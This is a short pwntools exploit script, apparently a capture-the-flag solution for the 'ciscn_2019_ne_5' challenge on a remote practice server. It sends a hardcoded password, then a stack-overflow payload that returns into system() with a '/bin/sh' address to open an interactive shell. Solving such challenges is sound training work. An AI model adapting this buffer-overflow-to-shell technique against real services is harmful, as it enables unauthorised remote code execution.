from pwn import *

#io = process('./ciscn_2019_ne_5')
io = remote('node4.buuoj.cn',25577)
elf = ELF('./ciscn_2019_ne_5')
context.log_level = 'debug'
raw_input()

passwd = b'administrator'
binsh_addr = 0x80482ea 
io.sendlineafter(b'word:',passwd)
payload = b'\x61' * 0x48 + b'\x62' * 4
payload += p32(elf.symbols['system'])
payload += p32(0xffdb85c0)
payload += p32(binsh_addr)

io.sendlineafter(b'0.Exit\n:',b'1')
io.sendlineafter(b'info',payload)

io.recvuntil(b'0.Exit\n:')
io.sendline(b'4')

io.interactive()
